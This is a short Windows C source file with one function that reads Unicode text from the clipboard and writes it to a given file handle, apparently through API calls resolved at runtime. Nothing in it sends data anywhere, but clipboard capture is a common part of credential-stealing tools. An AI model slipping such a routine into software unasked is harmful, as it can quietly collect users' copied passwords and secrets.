#include "clipboard.h"
#include "file.h"

DWORD write_clipboard_data(const HANDLE file)
{
	DWORD rc = 1;

	if (!LpOpenClipboard(NULL))
		goto out;

	const HANDLE handle = LpGetClipboardData(CF_UNICODETEXT);

	if (!handle)
		goto close;

	const LPCVOID data = LpGlobalLock(handle);

	if (!data)
		goto close;

	rc = write_wstr(file, (LPCWSTR)data);
	LpGlobalUnlock(handle);
close:
	LpCloseClipboard();
out:
	return rc;
}
